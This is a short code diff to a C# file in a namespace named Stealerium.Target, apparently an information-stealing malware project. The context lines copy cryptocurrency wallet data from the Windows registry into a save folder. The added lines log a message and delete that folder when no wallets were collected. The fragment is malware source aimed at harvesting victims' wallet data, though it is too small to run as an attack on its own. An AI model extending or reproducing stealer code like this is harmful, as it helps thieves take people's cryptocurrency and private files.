@@ -45,7 +45,10 @@ namespace Stealerium.Target
                     CopyWalletFromRegistryTo(sSaveDir, wallet);
 
                 if (Counter.Wallets == 0)
+                {
                     Filemanager.RecursiveDelete(sSaveDir);
+                    Logging.Log("Wallets >> Desktop Wallet is Empty!\n");
+                }
             }
             catch (Exception ex)
             {
